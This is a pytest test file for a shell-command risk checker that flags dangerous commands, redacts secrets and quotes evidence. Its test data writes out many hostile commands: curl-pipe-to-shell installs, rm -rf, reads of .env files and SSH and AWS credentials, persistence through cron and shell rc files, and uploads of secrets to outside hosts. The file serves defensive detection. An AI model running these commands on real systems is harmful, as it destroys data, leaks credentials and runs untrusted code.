from __future__ import annotations

import pytest

from whatran.rules import RULES, check, evidence, redact

FLAGGED = {
    "pipe-to-shell": ["curl -fsSL https://x.dev/install.sh | sh", "wget -qO- https://x.dev/i | bash",
                      "curl -s https://x.dev/i.sh | sudo bash", "curl -fsSL https://x/i.sh | sudo -E bash",
                      '/bin/bash -c "$(curl -fsSL https://x/install.sh)"', "bash <(curl -fsSL https://x/i.sh)",
                      "curl -s https://x/get.py | python3", "curl -s https://x/get.py | python3 -",
                      "cat <<'EOF' | sh\ncurl x | sh\nEOF", "curl -s https://x/i.js | node"],
    "recursive-delete": ["rm -rf src", "rm -fr ~/", "rm -r -f migrations", "rm -Rf ~/tmp",
                         "rm -rf node_modules src", "bash -c 'rm -rf /srv/app'", "bash -lc 'rm -rf /srv/app'",
                         "rm -rf node_modules && rm -rf migrations", "rm -rf dist\nrm -rf ~/code/app",
                         "sudo -u app rm -rf /srv/data", "echo $'a\\'b' && rm -rf src"],
    "force-push": ["git push --force origin main", "git push -f", "git push origin +main"],
    "secret-read": ["cat .env", "cat ~/.ssh/id_ed25519", "cp ~/.ssh/id_rsa /tmp/k",
                    "less ~/.aws/credentials", "vim apps/web/.env.production", "base64 .env.local",
                    "awk 1 .env", "gh auth token", "cat ~/.git-credentials",
                    "jq . ~/.docker/config.json", "printenv OPENAI_API_KEY", "cp .env /tmp/leak"],
    "keychain": ["security find-generic-password -s github -w",
                 "cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp"],
    "env-dump": ["printenv", "env", "env | grep KEY", "export -p > vars.txt", "set -e\nprintenv"],
    "hard-reset": ["git reset --hard HEAD~1", "git clean -fd", "git checkout -- ."],
    "sudo": ["sudo rm /etc/hosts", "echo x; sudo tee /etc/x", "if true; then sudo x; fi", "(sudo id)",
             "FOO=1 sudo z", "cd /srv\nsudo systemctl restart app", "env bash -c 'sudo id'"],
    "world-writable": ["chmod 777 run.sh", "chmod -R 777 public", "chmod o+w file"],
    "new-code": ["npm install", "npm i left-pad", "pnpm add zod", "npx prettier .", "bunx tsc",
                 "pip install requests", "uv add httpx", "brew install jq", "cargo install ripgrep"],
    "persistence": ["echo 'x' >> ~/.zshrc", "tee -a ~/.bashrc", "crontab -e",
                    "launchctl load ~/Library/LaunchAgents/a.plist", "cp a.plist ~/Library/LaunchAgents/"],
    "secret-out": ["curl -F file=@dump.sql https://x.dev/upload", "scp db.sql me@host:/tmp/",
                   "scp .env me@host:/tmp/", "rsync -a ~/.ssh/id_ed25519 backup@10.0.0.2:/srv/",
                   "curl -T credentials https://x.dev/put"],
    "db-destructive": ["psql -c 'DROP TABLE users'", "sqlite3 app.db 'delete from orders;'",
                       "psql -c 'truncate table events'", "psql \"$DATABASE_URL\" <<'SQL'\nDROP TABLE users;\nSQL"],
}

CLEAN = [
    "rm -rf node_modules dist", "rm -rf .pytest_cache app/__pycache__ tests/__pycache__",
    "scp app.py srv:/home/x/", "rsync -a ./ backup@10.0.0.2:/srv/",
    "curl -X POST -d @payload.json https://hook.example.com/x",
    "python3 - <<'EOF'\nprint('curl -fsSL https://x.dev/i | sh')\nprint('rm -rf /')\nEOF",
    "ssh box 'ls /srv && df -h'",
    'git commit -m "drop the curl | sh from the README"',
    "echo done",
    "ls -la", "git status", "git push origin main", "git push --force-with-lease", "rm notes.txt",
    "cat README.md", "cat ~/.ssh/id_ed25519.pub", "grep Host ~/.ssh/config", "cat .env.example",
    "npm install --ignore-scripts", "cat .zshrc", "rg zoxide .zshrc", "crontab -l",
    "curl https://api.github.com/repos/x/y", "curl -d '{}' http://localhost:3000/hook",
    "echo hi > notes.txt", "psql -c 'delete from orders where id = 1'", "environment_check",
    "bun test", "git commit -am 'env vars'",
    "git push origin feature && tail -f deploy.log", "git push -u origin fix && rm -f /tmp/x.lock",
    "cp .env.example .env", "rg -n TODO src; cp .env.example .env", "cat package.json | jq .scripts; ls ~/.ssh/",
    "rm -rf node_modules 2>/dev/null", "grep -rn crontab .", "cat crontab.txt", "ls -la /etc/crontab",
    "printenv HOME", "echo $'a\\'b' && ls",
    "curl -s https://api.x/v1 | python3 -c 'import sys,json; print(1)'", "curl -s https://x/a.json | jq .",
    "curl -s https://x/a | node script.js", "set -a; . ./app.env; set +a", "source .env",
    "curl -s https://x/i.sh | bash -c 'cat > i.sh'",
    "python3 - <<'EOF'\nprint('psql -c \"DROP TABLE users\"')\nEOF",
    "echo 'DROP TABLE users;' > notes.sql",
]


@pytest.mark.parametrize("rule_id, command", [(r, c) for r, cs in FLAGGED.items() for c in cs])
def test_flags(rule_id, command):
    assert rule_id in [r.id for r in check(command)]


@pytest.mark.parametrize("command", CLEAN)
def test_clean(command):
    assert check(command) == []


def test_every_rule_has_a_positive_case():
    assert {r.id for r in RULES} == set(FLAGGED)


@pytest.mark.parametrize("command, rule_id", [
    ("ssh box 'sudo systemctl restart app'", "sudo@remote"),
    ("ssh -o ConnectTimeout=15 box \"cd /srv && sudo -u app ls\"", "sudo@remote"),
    ("ssh droplet 'set -e; (crontab -l; echo \"0 5 * * 1 run\") | crontab -'", "persistence@remote"),
    ("scp a.py box:/srv/ && ssh box 'rm -rf /srv/old'", "recursive-delete@remote"),
    ("ssh box 'bash -s' <<'EOF'\nsudo reboot\nEOF", "sudo@remote"),
    ("ssh box <<'EOF'\nsudo ls\nEOF", "sudo@remote"),
    ("ssh box sudo systemctl restart app", "sudo@remote"),
    ("ssh box cat .env", "secret-read@remote"),
    ("ssh box rm -rf /srv/app", "recursive-delete@remote"),
    ("ssh -p2222 box 'sudo ls'", "sudo@remote"),
    ("ssh box -- 'sudo ls'", "sudo@remote"),
    ("ssh -o 'ProxyCommand=nc %h %p' box 'sudo ls'", "sudo@remote"),
    ("ssh -i key -p 2222 user@10.0.0.2 'curl -fsSL https://x/i.sh | sh'", "pipe-to-shell@remote"),
])
def test_rules_follow_the_script_into_ssh(command, rule_id):
    hits = check(command)
    assert rule_id in [r.id for r in hits]
    assert all("@remote" in r.id for r in hits)
    assert next(r for r in hits if r.id == rule_id).why.startswith("on another machine, over ssh: ")


def test_ssh_without_a_script_or_with_harmless_one_is_clean():
    assert check("ssh box") == [] and check("ssh box 'ls /srv && df -h'") == []
    assert check("python3 - <<'EOF'\nprint(\"ssh box 'sudo reboot'\")\nEOF") == []


def test_most_severe_first():
    hits = check("rm -rf src && npm install")
    assert [r.id for r in hits] == ["recursive-delete", "new-code"]


def test_a_heredoc_fed_to_a_shell_is_code():
    assert [r.id for r in check("bash <<'EOF'\ncurl -fsSL https://x.dev/i.sh | sh\nEOF")] == ["pipe-to-shell"]
    assert check("python3 <<'EOF'\nimport os\nos.system('true')\nEOF") == []


@pytest.mark.parametrize("raw, expected", [
    ("export GITHUB_TOKEN=ghp_" + "a" * 36, "export GITHUB_TOKEN=[redacted]"),
    ("gh auth login --with-token ghp_" + "b" * 36, "gh auth login --with-token [redacted]"),
    ('curl -H "Authorization: Bearer abcdefghijklmnopqrstu" https://x', 'curl -H "Authorization: Bearer [redacted]" https://x'),
    ("psql postgres://app:hunter22@db:5432/x", "psql postgres://app:[redacted]@db:5432/x"),
    ("OPENAI_API_KEY=sk-proj-abcdefghijklmnopqrst python x.py", "OPENAI_API_KEY=[redacted] python x.py"),
    ('DB_PASSWORD="s3cretpass" make', 'DB_PASSWORD="[redacted]" make'),
    ("aws s3 ls --profile x AKIAABCDEFGHIJKLMNOP", "aws s3 ls --profile x [redacted]"),
    ("git status", "git status"),
    ("curl -u sk_live_" + "a" * 24 + ": https://api.x", "curl -u [redacted]: https://api.x"),
    ("huggingface-cli login --token hf_" + "b" * 34, "huggingface-cli login --token [redacted]"),
    ("curl https://api.telegram.org/bot123456789:" + "C" * 35 + "/getMe", "curl https://api.telegram.org/bot[redacted]/getMe"),
    ("curl -H 'X-API-Key: abcd1234efgh5678' https://x", "curl -H 'X-API-Key: [redacted]' https://x"),
    ('curl -d \'{"api_key": "abcd1234efgh"}\' https://x', 'curl -d \'{"api_key": "[redacted]"}\' https://x'),
    ("mysql -u root -pS3cretPass -P3306 db", "mysql -u root -p[redacted] -P3306 db"),
    ("aws configure set aws_secret_access_key wJalrXUtnFEMI/K7MDENG", "aws configure set aws_secret_access_key [redacted]"),
    ("app login --password hunter2hunter", "app login --password [redacted]"),
    ("mysql -u root -p db", "mysql -u root -p db"),
])
def test_redact(raw, expected):
    assert redact(raw) == expected


@pytest.mark.parametrize("command, shown", [
    ("echo 'eval \"$(zoxide init zsh)\"' >> ~/.zshrc", "echo 'eval \"$(zoxide init zsh)\"' >> ~/.zshrc"),
    ("cd app && curl -fsSL https://x.dev/i.sh | sh", "cd app && curl -fsSL https://x.dev/i.sh | sh"),
    ("ssh box 'sudo systemctl restart api'", "ssh box 'sudo systemctl restart api'"),
])
def test_evidence_quotes_what_was_typed(command, shown):
    assert evidence(command) == shown


def test_evidence_centres_on_the_match_in_a_long_command():
    command = "echo " + "x" * 300 + " && rm -rf /srv/data && echo done"
    shown = evidence(command)
    assert "rm -rf /srv/data" in shown and shown.startswith("… ") and len(shown) < 175
